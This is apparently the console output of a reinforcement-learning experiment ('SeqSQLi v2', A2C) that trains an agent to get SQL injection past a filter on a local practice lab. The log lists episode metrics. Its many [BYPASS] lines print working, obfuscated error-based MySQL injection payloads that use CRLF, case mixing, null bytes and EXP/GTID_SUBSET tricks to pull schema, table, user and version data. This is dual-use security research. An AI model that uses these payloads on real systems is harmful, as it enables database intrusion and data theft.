/home/neet/.pyenv/versions/3.13.12/lib/python3.13/site-packages/stable_baselines3/common/on_policy_algorithm.py:150: UserWarning: You are trying to run A2C on the GPU, but it is primarily intended to run on the CPU when not using a CNN policy (you are using ActorCriticPolicy which should be a MlpPolicy). See https://github.com/DLR-RM/stable-baselines3/issues/1245 for more info. You can pass `device='cpu'` or `export CUDA_VISIBLE_DEVICES=` to force using the CPU.Note: The model will train, but the GPU utilization will be poor and the training might take longer than on CPU.
  warnings.warn(
============================================================
 SeqSQLi v2 — A2C Training
 URL         : http://localhost:8080/Less-1/
 Filter type : none
 Mode        : online-WAF (dual-signal: union+error)
 Payload pool: 108 validated from payloads_error_less1.csv
               (union=0, error=108)
 Timesteps   : 150000
 Rollout     : n_steps=5 (synchronous A3C variant)
 Seed        : 1
============================================================
  Ep   10 | SR=0% | Steps=15.0 | R=-45.01
  Ep 3930 | SR=0% | Steps=15.0 | R=-34.52
  [BYPASS] Ep 3932 | steps=7 | seq=case -> null_byte -> agg_swap -> hex_to_char -> dot_prefix -> case -> crlf
           payload: .11'%0d%0aAnd%0d%0aEXP(~(SElect%0d%0a*%0d%0aFRoM%0d%0a(selEcT%0d%0a((sElect%0d%0aJSON_ARRAYAGG(CoNCat(TaBle_schema,CHAR(46),taBlE_name))%0d%0aFrOM%0d%
  Ep 3940 | SR=10% | Steps=14.2 | R=-32.33
  Ep 3950 | SR=0% | Steps=15.0 | R=-37.21
  Ep 3960 | SR=0% | Steps=15.0 | R=-36.17
  Ep 3970 | SR=0% | Steps=15.0 | R=-37.28
  Ep 3980 | SR=0% | Steps=15.0 | R=-36.48
  Ep 3990 | SR=0% | Steps=15.0 | R=-36.90
  Ep 4000 | SR=0% | Steps=15.0 | R=-37.12
  Ep 4010 | SR=0% | Steps=15.0 | R=-36.23
  Ep 4020 | SR=0% | Steps=15.0 | R=-36.14
  Ep 4030 | SR=0% | Steps=15.0 | R=-35.97
  Ep 4040 | SR=0% | Steps=15.0 | R=-37.36
  Ep 4050 | SR=0% | Steps=15.0 | R=-37.11
  Ep 4060 | SR=0% | Steps=15.0 | R=-36.10
  Ep 4070 | SR=0% | Steps=15.0 | R=-37.02
  Ep 4080 | SR=0% | Steps=15.0 | R=-36.68
  Ep 4090 | SR=0% | Steps=15.0 | R=-36.48
  Ep 4100 | SR=0% | Steps=15.0 | R=-36.26
  Ep 4110 | SR=0% | Steps=15.0 | R=-36.37
  [BYPASS] Ep 4115 | steps=8 | seq=null_byte -> case -> crlf -> case -> hex_to_char -> case -> case -> agg_swap
           payload: 1'%0d%0aAND%0d%0aEXP(~(SELEct%0d%0a*%0d%0afROM%0d%0a(SELect%0d%0a((seleCT%0d%0aJSON_ARRAYAGG(CONCAT(Table_schema,CHAR(46),table_name))%0d%0afrom%0d%0a
  Ep 4120 | SR=10% | Steps=14.3 | R=-33.71
  Ep 4130 | SR=0% | Steps=15.0 | R=-37.11
  Ep 4140 | SR=0% | Steps=15.0 | R=-36.37
  Ep 4150 | SR=0% | Steps=15.0 | R=-36.83
  Ep 4160 | SR=0% | Steps=15.0 | R=-37.31
  Ep 4170 | SR=0% | Steps=15.0 | R=-35.99
  Ep 4180 | SR=0% | Steps=15.0 | R=-35.82
  Ep 4190 | SR=0% | Steps=15.0 | R=-36.99
  Ep 4200 | SR=0% | Steps=15.0 | R=-36.71
  [BYPASS] Ep 4209 | steps=9 | seq=case -> agg_swap -> case -> crlf -> case -> case -> case -> case -> null_byte
           payload: 1'%0d%0aAND%0d%0aEXP(~(sEleCt%0d%0a*%0d%0aFrOM%0d%0a(SeLeCt%0d%0a((sElECT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrOm%0d%0aINformAtiON_scHemA.schemata))
  Ep 4210 | SR=10% | Steps=14.4 | R=-32.53
  Ep 4220 | SR=0% | Steps=15.0 | R=-36.87
  Ep 4230 | SR=0% | Steps=15.0 | R=-36.93
  [BYPASS] Ep 4237 | steps=6 | seq=agg_swap -> agg_swap -> null_byte -> crlf -> func_sp_nbsp -> case
           payload: 1'%0d%0aanD%0d%0aEXP(~(SElECT%0d%0a*%0d%0afROM%0d%0a(sELECT%0d%0a((seLEct%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFRoM%0d%0ainFOrmAtion_sCHEMA.schemata))
  Ep 4240 | SR=10% | Steps=14.1 | R=-30.67
  [BYPASS] Ep 4244 | steps=4 | seq=agg_swap -> null_byte -> crlf -> case
           payload: 1'%0d%0aAnd%0d%0aEXP(~(SelecT%0d%0a*%0d%0afRoM%0d%0a(SeLEct%0d%0a((sEleCT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afroM%0d%0aInfORMaTiON_sChEMa.schemata))
  [BYPASS] Ep 4249 | steps=9 | seq=case -> null_byte -> case -> concat_char -> case -> crlf -> case -> case -> func_sp_nbsp
           payload: 1'%0d%0aAND%0d%0aGTID_SUBSET((user%a0()),1);%00
  Ep 4250 | SR=20% | Steps=13.3 | R=-29.80
  Ep 4260 | SR=0% | Steps=15.0 | R=-36.06
  Ep 4270 | SR=0% | Steps=15.0 | R=-36.43
  Ep 4280 | SR=0% | Steps=15.0 | R=-35.37
  Ep 4290 | SR=0% | Steps=15.0 | R=-36.75
  Ep 4300 | SR=0% | Steps=15.0 | R=-36.59
  Ep 4310 | SR=0% | Steps=15.0 | R=-37.12
  [BYPASS] Ep 4315 | steps=11 | seq=hex_to_char -> agg_swap -> case -> crlf -> case -> func_sp_nl -> case -> case -> func_sp_nl -> case -> null_byte
           payload: 1'%0d%0aaND%0d%0aEXP(~(SeleCt%0d%0a*%0d%0afROM%0d%0a(sELeCT%0d%0a((seLect%0d%0aJSON_ARRAYAGG(conCaT(taBLE_schema,CHAR(46),TABlE_name))%0d%0afRom%0d%0a
  Ep 4320 | SR=10% | Steps=14.6 | R=-32.79
  Ep 4330 | SR=0% | Steps=15.0 | R=-35.44
  Ep 4340 | SR=0% | Steps=15.0 | R=-36.55
  Ep 4350 | SR=0% | Steps=15.0 | R=-36.26
  [BYPASS] Ep 4355 | steps=13 | seq=null_byte -> crlf -> null_byte -> case -> hex_to_char -> case -> case -> func_sp_nl -> case -> case -> case -> case -> agg_swap
           payload: 1'%0d%0aANd%0d%0aEXP(~(sELECt%0d%0a*%0d%0afroM%0d%0a(SelecT%0d%0a((SElECt%0d%0aJSON_ARRAYAGG(CONCAT(tabLE_schema,CHAR(46),tAbLE_name))%0d%0aFrOM%0d%0a
  [BYPASS] Ep 4357 | steps=8 | seq=null_byte -> crlf -> case -> case -> case -> case -> case -> func_sp_nbsp
           payload: 1'%0d%0aand%0d%0aGTID_SUBSET((DaTabaSE%a0()),1);%00
  Ep 4360 | SR=20% | Steps=14.1 | R=-31.43
  Ep 4370 | SR=0% | Steps=15.0 | R=-36.53
  Ep 4380 | SR=0% | Steps=15.0 | R=-36.60
  Ep 4390 | SR=0% | Steps=15.0 | R=-37.09
  Ep 4400 | SR=0% | Steps=15.0 | R=-35.49
  [BYPASS] Ep 4407 | steps=5 | seq=null_byte -> agg_swap -> null_byte -> crlf -> case
           payload: 1'%0d%0aANd%0d%0aEXP(~(sELecT%0d%0a*%0d%0aFrOM%0d%0a(sELECT%0d%0a((sEleCT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afROm%0d%0aInfoRmatIon_SCheMA.schemata))
  Ep 4410 | SR=10% | Steps=14.0 | R=-33.47
  Ep 4420 | SR=0% | Steps=15.0 | R=-36.76
  [BYPASS] Ep 4430 | steps=5 | seq=null_byte -> crlf -> case -> case -> agg_swap
           payload: 1'%0d%0aAnD%0d%0aEXP(~(sElect%0d%0a*%0d%0aFrOm%0d%0a(SeLECT%0d%0a((SeleCt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrOM%0d%0aINformatION_sChEmA.schemata))
  Ep 4430 | SR=10% | Steps=14.0 | R=-32.66
  Ep 4440 | SR=0% | Steps=15.0 | R=-36.05
  Ep 4450 | SR=0% | Steps=15.0 | R=-37.85
  [BYPASS] Ep 4456 | steps=15 | seq=null_byte -> crlf -> case -> hex_to_char -> case -> case -> case -> case -> case -> case -> case -> case -> case -> case -> agg_swap
           payload: 1'%0d%0aAnd%0d%0aEXP(~(seLEct%0d%0a*%0d%0afrom%0d%0a(SELEct%0d%0a((SelECt%0d%0aJSON_ARRAYAGG(CONCAT(TAbLe_schema,CHAR(46),taBLe_name))%0d%0afrOM%0d%0a
  Ep 4460 | SR=10% | Steps=15.0 | R=-34.78
  [BYPASS] Ep 4468 | steps=4 | seq=agg_swap -> null_byte -> crlf -> case
           payload: 1'%0d%0aaNd%0d%0aEXP(~(SEleCt%0d%0a*%0d%0afroM%0d%0a(sElEct%0d%0a((sElect%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFroM%0d%0ainFOrMAtIoN_SchEMA.schemata))
  Ep 4470 | SR=10% | Steps=13.9 | R=-30.04
  [BYPASS] Ep 4479 | steps=11 | seq=case -> null_byte -> crlf -> hex_to_char -> case -> case -> case -> case -> case -> case -> agg_swap
           payload: 1'%0d%0aAnD%0d%0aEXP(~(sELEcT%0d%0a*%0d%0aFrOM%0d%0a(SElECt%0d%0a((SeLecT%0d%0aJSON_ARRAYAGG(CONCAT(TAbLE_schema,CHAR(46),tabLe_name))%0d%0afRom%0d%0a
  Ep 4480 | SR=10% | Steps=14.6 | R=-34.01
  Ep 4490 | SR=0% | Steps=15.0 | R=-35.82
  [BYPASS] Ep 4492 | steps=10 | seq=null_byte -> crlf -> case -> case -> case -> case -> case -> case -> case -> agg_swap
           payload: 1'%0d%0aaNd%0d%0aEXP(~(sELEcT%0d%0a*%0d%0aFRom%0d%0a(SeLECT%0d%0a((SElEcT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afRom%0d%0aiNfOrMAtION_scHema.schemata))
  Ep 4500 | SR=10% | Steps=14.5 | R=-33.32
  Ep 4510 | SR=0% | Steps=15.0 | R=-36.50
  Ep 4520 | SR=0% | Steps=15.0 | R=-34.82
  Ep 4530 | SR=0% | Steps=15.0 | R=-34.65
  Ep 4540 | SR=0% | Steps=15.0 | R=-36.19
  Ep 4550 | SR=0% | Steps=15.0 | R=-36.13
  Ep 4560 | SR=0% | Steps=15.0 | R=-36.38
  [BYPASS] Ep 4562 | steps=9 | seq=null_byte -> crlf -> hex_to_char -> case -> case -> case -> case -> case -> agg_swap
           payload: 1'%0d%0aAND%0d%0aEXP(~(SelEct%0d%0a*%0d%0afrOm%0d%0a(selecT%0d%0a((SeLect%0d%0aJSON_ARRAYAGG(CONCAT(taBLe_schema,CHAR(46),tABlE_name))%0d%0aFrOm%0d%0a
  Ep 4570 | SR=10% | Steps=14.4 | R=-32.68
  [BYPASS] Ep 4580 | steps=4 | seq=agg_swap -> null_byte -> crlf -> case
           payload: 1'%0d%0aanD%0d%0aEXP(~(SeLECt%0d%0a*%0d%0aFRoM%0d%0a(sELECt%0d%0a((SEleCT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afROm%0d%0aiNFOrMATioN_SChEmA.schemata))
  Ep 4580 | SR=10% | Steps=13.9 | R=-31.88
  Ep 4590 | SR=0% | Steps=15.0 | R=-33.85
  Ep 4600 | SR=0% | Steps=15.0 | R=-35.06
  [BYPASS] Ep 4602 | steps=5 | seq=null_byte -> crlf -> case -> case -> func_sp_nbsp
           payload: 1'%0d%0aANd%0d%0aGTID_SUBSET((user%a0()),1);%00
  Ep 4610 | SR=10% | Steps=14.0 | R=-32.11
  Ep 4620 | SR=0% | Steps=15.0 | R=-35.90
  Ep 4630 | SR=0% | Steps=15.0 | R=-36.83
  Ep 4640 | SR=0% | Steps=15.0 | R=-36.14
  Ep 4650 | SR=0% | Steps=15.0 | R=-36.15
  [BYPASS] Ep 4652 | steps=5 | seq=null_byte -> crlf -> hex_to_char -> case -> agg_swap
           payload: 1'%0d%0aaNd%0d%0aEXP(~(sELeCT%0d%0a*%0d%0afrom%0d%0a(SeLEct%0d%0a((SElEcT%0d%0aJSON_ARRAYAGG(CONCAT(taBLE_schema,CHAR(46),TaBlE_name))%0d%0afROM%0d%0a
  Ep 4660 | SR=10% | Steps=14.0 | R=-32.79
  Ep 4670 | SR=0% | Steps=15.0 | R=-35.68
  [BYPASS] Ep 4672 | steps=13 | seq=agg_swap -> case -> null_byte -> crlf -> case -> case -> case -> case -> case -> case -> case -> case -> func_sp_nbsp
           payload: 1'%0d%0aanD%0d%0aEXP(~(SELECt%0d%0a*%0d%0afRoM%0d%0a(seLECT%0d%0a((SeLecT%0d%0aJSON_ARRAYAGG(column_name)%0d%0afRom%0d%0aINfORmAtIon_SCHeMA.columns%0d
  Ep 4680 | SR=10% | Steps=14.8 | R=-33.40
  [BYPASS] Ep 4683 | steps=6 | seq=null_byte -> crlf -> hex_to_char -> case -> case -> agg_swap
           payload: 1'%0d%0aAND%0d%0aEXP(~(SeLECt%0d%0a*%0d%0aFRom%0d%0a(SELEct%0d%0a((selECt%0d%0aJSON_ARRAYAGG(CONCAT(table_schema,CHAR(46),tAbLe_name))%0d%0aFrOm%0d%0a
  Ep 4690 | SR=10% | Steps=14.1 | R=-31.36
  [BYPASS] Ep 4693 | steps=6 | seq=agg_swap -> case -> null_byte -> crlf -> case -> hex_to_char
           payload: 1'%0d%0aaNd%0d%0aEXP(~(SeleCt%0d%0a*%0d%0aFroM%0d%0a(SELEcT%0d%0a((selecT%0d%0aJSON_ARRAYAGG(CONCat(TABlE_schema,CHAR(46),TaBLE_name))%0d%0aFROm%0d%0a
  Ep 4700 | SR=10% | Steps=14.1 | R=-31.84
  [BYPASS] Ep 4705 | steps=7 | seq=null_byte -> case -> func_sp_ff -> agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aANd%0d%0aEXP(~(SELeCT%0d%0a*%0d%0afROM%0d%0a(sElEct%0d%0a((SEleCT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFROm%0d%0aINfOrMaTion_SchEma.schemata))
  Ep 4710 | SR=10% | Steps=14.2 | R=-31.47
  Ep 4720 | SR=0% | Steps=15.0 | R=-35.45
  Ep 4730 | SR=0% | Steps=15.0 | R=-36.38
  [BYPASS] Ep 4734 | steps=5 | seq=agg_swap -> null_byte -> crlf -> hex_to_char -> case
           payload: 1'%0d%0aanD%0d%0aEXP(~(sEleCT%0d%0a*%0d%0aFRom%0d%0a(SEleCT%0d%0a((SeLeCt%0d%0aJSON_ARRAYAGG(CoNCaT(TAblE_schema,CHAR(46),TAblE_name))%0d%0afRoM%0d%0a
  Ep 4740 | SR=10% | Steps=14.0 | R=-32.01
  Ep 4750 | SR=0% | Steps=15.0 | R=-37.14
  Ep 4760 | SR=0% | Steps=15.0 | R=-36.97
  Ep 4770 | SR=0% | Steps=15.0 | R=-34.69
  Ep 4780 | SR=0% | Steps=15.0 | R=-34.24
  [BYPASS] Ep 4785 | steps=5 | seq=case -> agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aAnd%0d%0aEXP(~(seleCt%0d%0a*%0d%0aFrom%0d%0a(sElect%0d%0a((sELEct%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFRom%0d%0aInFormAtIon_SchEMA.schemata))
  Ep 4790 | SR=10% | Steps=14.0 | R=-31.71
  [BYPASS] Ep 4792 | steps=5 | seq=null_byte -> crlf -> case -> hex_to_char -> agg_swap
           payload: 1'%0d%0aanD%0d%0aEXP(~(sElEct%0d%0a*%0d%0afrOM%0d%0a(SELecT%0d%0a((sEleCt%0d%0aJSON_ARRAYAGG(CONCAT(TAbLE_schema,CHAR(46),tAbLE_name))%0d%0afROm%0d%0a
  Ep 4800 | SR=10% | Steps=14.0 | R=-32.17
  Ep 4810 | SR=0% | Steps=15.0 | R=-37.37
  [BYPASS] Ep 4815 | steps=12 | seq=null_byte -> crlf -> case -> case -> agg_swap -> case -> case -> case -> case -> case -> case -> func_sp_nbsp
           payload: 1'%0d%0aAnd%0d%0aGTID_SUBSET((user%a0()),1);%00
  Ep 4820 | SR=10% | Steps=14.7 | R=-34.51
  Ep 4830 | SR=0% | Steps=15.0 | R=-35.31
  Ep 4840 | SR=0% | Steps=15.0 | R=-34.19
  Ep 4850 | SR=0% | Steps=15.0 | R=-34.00
  Ep 4860 | SR=0% | Steps=15.0 | R=-36.39
  Ep 4870 | SR=0% | Steps=15.0 | R=-34.99
  Ep 4880 | SR=0% | Steps=15.0 | R=-35.41
  Ep 4890 | SR=0% | Steps=15.0 | R=-36.25
  Ep 4900 | SR=0% | Steps=15.0 | R=-34.16
  [BYPASS] Ep 4904 | steps=9 | seq=null_byte -> crlf -> case -> hex_to_char -> case -> case -> case -> case -> agg_swap
           payload: 1'%0d%0aANd%0d%0aEXP(~(seLEcT%0d%0a*%0d%0aFROM%0d%0a(sELECT%0d%0a((SElEcT%0d%0aJSON_ARRAYAGG(CONCAT(taBle_schema,CHAR(46),tAblE_name))%0d%0afRoM%0d%0a
  Ep 4910 | SR=10% | Steps=14.4 | R=-30.84
  Ep 4920 | SR=0% | Steps=15.0 | R=-35.74
  Ep 4930 | SR=0% | Steps=15.0 | R=-36.05
  Ep 4940 | SR=0% | Steps=15.0 | R=-35.33
  Ep 4950 | SR=0% | Steps=15.0 | R=-36.13
  Ep 4960 | SR=0% | Steps=15.0 | R=-36.59
  Ep 4970 | SR=0% | Steps=15.0 | R=-36.05
  Ep 4980 | SR=0% | Steps=15.0 | R=-35.40
  Ep 4990 | SR=0% | Steps=15.0 | R=-35.24
  Ep 5000 | SR=0% | Steps=15.0 | R=-35.67
  Ep 5010 | SR=0% | Steps=15.0 | R=-35.28
  Ep 5020 | SR=0% | Steps=15.0 | R=-33.98
  Ep 5030 | SR=0% | Steps=15.0 | R=-35.96
  [BYPASS] Ep 5034 | steps=9 | seq=null_byte -> crlf -> case -> case -> hex_to_char -> case -> case -> case -> agg_swap
           payload: 1'%0d%0aaNd%0d%0aEXP(~(sELECT%0d%0a*%0d%0afrom%0d%0a(SELEcT%0d%0a((SElect%0d%0aJSON_ARRAYAGG(CONCAT(TablE_schema,CHAR(46),taBLE_name))%0d%0afRoM%0d%0a
  [BYPASS] Ep 5035 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aaNd%0d%0aEXP(~(SeleCt%0d%0a*%0d%0afroM%0d%0a(sELECT%0d%0a((sELECT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFROm%0d%0ainformATiOn_SchEma.schemata))
  [BYPASS] Ep 5039 | steps=8 | seq=agg_swap -> case -> null_byte -> crlf -> case -> case -> case -> func_sp_nbsp
           payload: 1'%0d%0aAND%0d%0aEXP(~(selecT%0d%0a*%0d%0aFroM%0d%0a(SeLEct%0d%0a(user%a0()))a));%00
  Ep 5040 | SR=30% | Steps=12.6 | R=-25.62
  Ep 5050 | SR=0% | Steps=15.0 | R=-35.86
  [BYPASS] Ep 5055 | steps=11 | seq=case -> case -> case -> null_byte -> crlf -> case -> case -> case -> func_sp_nl -> func_sp_nl -> agg_swap
           payload: 1'%0d%0aAND%0d%0aEXP(~(sElEcT%0d%0a*%0d%0aFROm%0d%0a(SElEcT%0d%0a((SElecT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFROM%0d%0ainFOrMATiON_SChEMA.schemata))
  Ep 5060 | SR=10% | Steps=14.6 | R=-33.56
  [BYPASS] Ep 5061 | steps=9 | seq=null_byte -> null_byte -> crlf -> case -> hex_to_char -> case -> case -> case -> agg_swap
           payload: 1'%0d%0aaNd%0d%0aEXP(~(sElECT%0d%0a*%0d%0aFRom%0d%0a(SeLect%0d%0a((SElect%0d%0aJSON_ARRAYAGG(CONCAT(tAblE_schema,CHAR(46),TabLe_name))%0d%0afrOM%0d%0a
  Ep 5070 | SR=10% | Steps=14.4 | R=-31.43
  Ep 5080 | SR=0% | Steps=15.0 | R=-37.09
  Ep 5090 | SR=0% | Steps=15.0 | R=-34.23
  Ep 5100 | SR=0% | Steps=15.0 | R=-36.62
  [BYPASS] Ep 5108 | steps=5 | seq=case -> agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aANd%0d%0aEXP(~(sELEcT%0d%0a*%0d%0afroM%0d%0a(SElECT%0d%0a((SElEcT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrOM%0d%0aiNForMatiOn_ScHeMA.schemata))
  Ep 5110 | SR=10% | Steps=14.0 | R=-31.66
  Ep 5120 | SR=0% | Steps=15.0 | R=-35.26
  Ep 5130 | SR=0% | Steps=15.0 | R=-34.49
  Ep 5140 | SR=0% | Steps=15.0 | R=-35.89
  Ep 5150 | SR=0% | Steps=15.0 | R=-34.58
  Ep 5160 | SR=0% | Steps=15.0 | R=-36.81
  Ep 5170 | SR=0% | Steps=15.0 | R=-35.62
  Ep 5180 | SR=0% | Steps=15.0 | R=-35.71
  Ep 5190 | SR=0% | Steps=15.0 | R=-36.33
  Ep 5200 | SR=0% | Steps=15.0 | R=-35.84
  Ep 5210 | SR=0% | Steps=15.0 | R=-36.88
  Ep 5220 | SR=0% | Steps=15.0 | R=-35.86
  [BYPASS] Ep 5223 | steps=8 | seq=case -> case -> null_byte -> crlf -> case -> hex_to_char -> case -> agg_swap
           payload: 1'%0d%0aaNd%0d%0aEXP(~(SElEcT%0d%0a*%0d%0aFrOm%0d%0a(seLeCT%0d%0a((SeLeCt%0d%0aJSON_ARRAYAGG(CONCAT(tAble_schema,CHAR(46),taBLe_name))%0d%0afroM%0d%0a
  Ep 5230 | SR=10% | Steps=14.3 | R=-31.37
  Ep 5240 | SR=0% | Steps=15.0 | R=-35.91
  Ep 5250 | SR=0% | Steps=15.0 | R=-36.03
  Ep 5260 | SR=0% | Steps=15.0 | R=-35.98
  Ep 5270 | SR=0% | Steps=15.0 | R=-36.39
  Ep 5280 | SR=0% | Steps=15.0 | R=-36.89
  [BYPASS] Ep 5283 | steps=10 | seq=case -> null_byte -> crlf -> case -> case -> case -> case -> case -> case -> agg_swap
           payload: 1'%0d%0aANd%0d%0aEXP(~(SEleCt%0d%0a*%0d%0aFroM%0d%0a(SeLEct%0d%0a((sELeCT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrOM%0d%0aiNFoRmAtioN_ScHEMA.schemata))
  Ep 5290 | SR=10% | Steps=14.5 | R=-32.78
  Ep 5300 | SR=0% | Steps=15.0 | R=-36.09
  Ep 5310 | SR=0% | Steps=15.0 | R=-36.33
  Ep 5320 | SR=0% | Steps=15.0 | R=-34.89
  Ep 5330 | SR=0% | Steps=15.0 | R=-36.37
  Ep 5340 | SR=0% | Steps=15.0 | R=-35.54
  Ep 5350 | SR=0% | Steps=15.0 | R=-35.29
  [BYPASS] Ep 5360 | steps=5 | seq=case -> null_byte -> crlf -> case -> func_sp_nbsp
           payload: 1'%0d%0aaND%0d%0aEXP(~(SElect%0d%0a*%0d%0aFROm%0d%0a(seLECt%0d%0a(user%a0()))a));%00
  Ep 5360 | SR=10% | Steps=14.0 | R=-31.79
  Ep 5370 | SR=0% | Steps=15.0 | R=-34.88
  Ep 5380 | SR=0% | Steps=15.0 | R=-36.13
  Ep 5390 | SR=0% | Steps=15.0 | R=-36.19
  [BYPASS] Ep 5392 | steps=5 | seq=null_byte -> crlf -> case -> case -> func_sp_nbsp
           payload: 1'%0d%0aAnd%0d%0aGTID_SUBSET((version%a0()),1);%00
  Ep 5400 | SR=10% | Steps=14.0 | R=-31.82
  Ep 5410 | SR=0% | Steps=15.0 | R=-34.96
  Ep 5420 | SR=0% | Steps=15.0 | R=-35.65
  Ep 5430 | SR=0% | Steps=15.0 | R=-35.48
  Ep 5440 | SR=0% | Steps=15.0 | R=-36.65
  [BYPASS] Ep 5446 | steps=4 | seq=agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aanD%0d%0aEXP(~(sEleCT%0d%0a*%0d%0aFROM%0d%0a(sELect%0d%0a((SEleCt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrom%0d%0aiNformaTioN_ScHEma.schemata))
  Ep 5450 | SR=10% | Steps=13.9 | R=-30.73
  Ep 5460 | SR=0% | Steps=15.0 | R=-36.05
  Ep 5470 | SR=0% | Steps=15.0 | R=-34.60
  Ep 5480 | SR=0% | Steps=15.0 | R=-34.47
  Ep 5490 | SR=0% | Steps=15.0 | R=-34.94
  Ep 5500 | SR=0% | Steps=15.0 | R=-35.58
  Ep 5510 | SR=0% | Steps=15.0 | R=-36.36
  Ep 5520 | SR=0% | Steps=15.0 | R=-35.89
  Ep 5530 | SR=0% | Steps=15.0 | R=-36.37
  Ep 5540 | SR=0% | Steps=15.0 | R=-35.69
  Ep 5550 | SR=0% | Steps=15.0 | R=-36.27
  Ep 5560 | SR=0% | Steps=15.0 | R=-34.11
  Ep 5570 | SR=0% | Steps=15.0 | R=-34.46
  [BYPASS] Ep 5572 | steps=6 | seq=case -> null_byte -> crlf -> case -> case -> func_sp_nbsp
           payload: 1'%0d%0aAND%0d%0aGTID_SUBSET((user%a0()),1);%00
  Ep 5580 | SR=10% | Steps=14.1 | R=-30.55
  Ep 5590 | SR=0% | Steps=15.0 | R=-35.74
  [BYPASS] Ep 5595 | steps=14 | seq=null_byte -> crlf -> case -> case -> case -> case -> hex_to_char -> case -> case -> case -> case -> case -> case -> func_sp_nbsp
           payload: 1'%0d%0aaNd%0d%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 5598 | steps=6 | seq=null_byte -> crlf -> case -> case -> case -> func_sp_nbsp
           payload: 1'%0d%0aaNd%0d%0aGTID_SUBSET((version%a0()),1);%00
  Ep 5600 | SR=20% | Steps=14.0 | R=-30.52
  Ep 5610 | SR=0% | Steps=15.0 | R=-34.95
  Ep 5620 | SR=0% | Steps=15.0 | R=-36.13
  Ep 5630 | SR=0% | Steps=15.0 | R=-35.89
  Ep 5640 | SR=0% | Steps=15.0 | R=-35.51
  Ep 5650 | SR=0% | Steps=15.0 | R=-35.56
  [BYPASS] Ep 5652 | steps=4 | seq=func_sp_nbsp -> case -> null_byte -> crlf
           payload: 1'%0d%0aanD%0d%0aGTID_SUBSET((user%a0()),1);%00
  Ep 5660 | SR=10% | Steps=13.9 | R=-30.22
  Ep 5670 | SR=0% | Steps=15.0 | R=-36.11
  Ep 5680 | SR=0% | Steps=15.0 | R=-35.78
  Ep 5690 | SR=0% | Steps=15.0 | R=-36.25
  Ep 5700 | SR=0% | Steps=15.0 | R=-35.44
  Ep 5710 | SR=0% | Steps=15.0 | R=-35.46
  Ep 5720 | SR=0% | Steps=15.0 | R=-33.53
  Ep 5730 | SR=0% | Steps=15.0 | R=-35.63
  [BYPASS] Ep 5731 | steps=5 | seq=case -> agg_swap -> case -> null_byte -> crlf
           payload: 1'%0d%0aAND%0d%0aEXP(~(sElECt%0d%0a*%0d%0aFROm%0d%0a(SELECt%0d%0a((SeLEct%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrOm%0d%0aINFoRmatiOn_SchEma.schemata))
  Ep 5740 | SR=10% | Steps=14.0 | R=-32.13
  Ep 5750 | SR=0% | Steps=15.0 | R=-33.58
  Ep 5760 | SR=0% | Steps=15.0 | R=-36.97
  Ep 5770 | SR=0% | Steps=15.0 | R=-33.19
  Ep 5780 | SR=0% | Steps=15.0 | R=-35.73
  Ep 5790 | SR=0% | Steps=15.0 | R=-33.77
  Ep 5800 | SR=0% | Steps=15.0 | R=-35.90
  Ep 5810 | SR=0% | Steps=15.0 | R=-34.06
  [BYPASS] Ep 5811 | steps=5 | seq=agg_swap -> case -> null_byte -> crlf -> hex_to_char
           payload: 1'%0d%0aANd%0d%0aEXP(~(sELEcT%0d%0a*%0d%0afRoM%0d%0a(seleCT%0d%0a((seLECt%0d%0aJSON_ARRAYAGG(concat(tABLE_schema,CHAR(46),tabLE_name))%0d%0afrom%0d%0a
